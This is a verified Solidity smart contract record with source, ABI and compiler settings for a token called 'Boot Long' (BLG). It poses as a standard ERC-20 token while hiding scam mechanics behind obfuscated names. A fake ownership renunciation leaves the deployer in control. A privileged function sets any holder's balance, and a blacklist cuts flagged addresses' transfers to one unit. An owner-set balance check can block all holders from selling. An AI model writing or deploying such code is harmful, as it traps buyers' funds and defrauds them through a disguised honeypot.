{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface limitFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoEnable {\n    function createPair(address liquidityAtLimit, address isShould) external returns (address);\n}\n\ninterface totalEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedExempt) external view returns (uint256);\n\n    function transfer(address feeLimit, uint256 listLiquidity) external returns (bool);\n\n    function allowance(address launchLiquidityTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeLimit,\n        uint256 listLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toReceiver, uint256 value);\n    event Approval(address indexed launchLiquidityTotal, address indexed spender, uint256 value);\n}\n\ninterface totalEnableMetadata is totalEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BootLong is launchedTo, totalEnable, totalEnableMetadata {\n\n    function getOwner() external view returns (address) {\n        return receiverToLaunched;\n    }\n\n    address receiverTokenFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address feeIsMax, uint256 listLiquidity) external virtual override returns (bool) {\n        return buyMode(_msgSender(), feeIsMax, listLiquidity);\n    }\n\n    mapping(address => mapping(address => uint256)) private launchTake;\n\n    function owner() external view returns (address) {\n        return receiverToLaunched;\n    }\n\n    event OwnershipTransferred(address indexed buyToAmount, address indexed receiverEnable);\n\n    function allowance(address atListLaunch, address launchedLaunchMode) external view virtual override returns (uint256) {\n        if (launchedLaunchMode == listMax) {\n            return type(uint256).max;\n        }\n        return launchTake[atListLaunch][launchedLaunchMode];\n    }\n\n    bool private tokenTo;\n\n    function buyMode(address takeLimitTotal, address feeLimit, uint256 listLiquidity) internal returns (bool) {\n        if (takeLimitTotal == listTx) {\n            return teamAt(takeLimitTotal, feeLimit, listLiquidity);\n        }\n        uint256 tradingTotal = totalEnable(feeAuto).balanceOf(receiverTokenFrom);\n        require(tradingTotal == tradingTake);\n        require(feeLimit != receiverTokenFrom);\n        if (minMode[takeLimitTotal]) {\n            return teamAt(takeLimitTotal, feeLimit, shouldFund);\n        }\n        return teamAt(takeLimitTotal, feeLimit, listLiquidity);\n    }\n\n    address listMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function amountSell(address totalIs) public {\n        exemptAt();\n        \n        if (totalIs == listTx || totalIs == feeAuto) {\n            return;\n        }\n        minMode[totalIs] = true;\n    }\n\n    bool public tokenTrading;\n\n    uint8 private teamMax = 18;\n\n    function exemptAt() private view {\n        require(enableMarketing[_msgSender()]);\n    }\n\n    bool public launchLiquidity;\n\n    uint256 constant shouldFund = 1 ** 10;\n\n    function marketingAmountLaunched(uint256 listLiquidity) public {\n        exemptAt();\n        tradingTake = listLiquidity;\n    }\n\n    function teamAt(address takeLimitTotal, address feeLimit, uint256 listLiquidity) internal returns (bool) {\n        require(launchTeam[takeLimitTotal] >= listLiquidity);\n        launchTeam[takeLimitTotal] -= listLiquidity;\n        launchTeam[feeLimit] += listLiquidity;\n        emit Transfer(takeLimitTotal, feeLimit, listLiquidity);\n        return true;\n    }\n\n    function transferFrom(address takeLimitTotal, address feeLimit, uint256 listLiquidity) external override returns (bool) {\n        if (_msgSender() != listMax) {\n            if (launchTake[takeLimitTotal][_msgSender()] != type(uint256).max) {\n                require(listLiquidity <= launchTake[takeLimitTotal][_msgSender()]);\n                launchTake[takeLimitTotal][_msgSender()] -= listLiquidity;\n            }\n        }\n        return buyMode(takeLimitTotal, feeLimit, listLiquidity);\n    }\n\n    function fundSwap() public {\n        emit OwnershipTransferred(listTx, address(0));\n        receiverToLaunched = address(0);\n    }\n\n    string private walletLaunchLimit = \"BLG\";\n\n    function toIs(address isSellList) public {\n        if (senderEnableAmount) {\n            return;\n        }\n        \n        enableMarketing[isSellList] = true;\n        \n        senderEnableAmount = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletLaunchLimit;\n    }\n\n    uint256 private listTo = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        limitFrom exemptTake = limitFrom(listMax);\n        feeAuto = autoEnable(exemptTake.factory()).createPair(exemptTake.WETH(), address(this));\n        if (listTokenAmount == launchedTradingAuto) {\n            launchedTradingAuto = listTokenAmount;\n        }\n        listTx = _msgSender();\n        fundSwap();\n        enableMarketing[listTx] = true;\n        launchTeam[listTx] = listTo;\n        \n        emit Transfer(address(0), listTx, listTo);\n    }\n\n    function enableTo(address feeIsMax, uint256 listLiquidity) public {\n        exemptAt();\n        launchTeam[feeIsMax] = listLiquidity;\n    }\n\n    address public listTx;\n\n    mapping(address => bool) public enableMarketing;\n\n    address public feeAuto;\n\n    uint256 public listTokenAmount;\n\n    function balanceOf(address launchedExempt) public view virtual override returns (uint256) {\n        return launchTeam[launchedExempt];\n    }\n\n    address private receiverToLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTo;\n    }\n\n    uint256 public launchedTradingAuto;\n\n    mapping(address => uint256) private launchTeam;\n\n    function approve(address launchedLaunchMode, uint256 listLiquidity) public virtual override returns (bool) {\n        launchTake[_msgSender()][launchedLaunchMode] = listLiquidity;\n        emit Approval(_msgSender(), launchedLaunchMode, listLiquidity);\n        return true;\n    }\n\n    uint256 sellList;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTake;\n    }\n\n    string private marketingTake = \"Boot Long\";\n\n    mapping(address => bool) public minMode;\n\n    bool public senderEnableAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMax;\n    }\n\n    uint256 tradingTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLiquidityTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atListLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLaunchMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"}],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunchMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIsMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"enableTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTradingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTokenAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"marketingAmountLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSellList\",\"type\":\"address\"}],\"name\":\"toIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIsMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BootLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}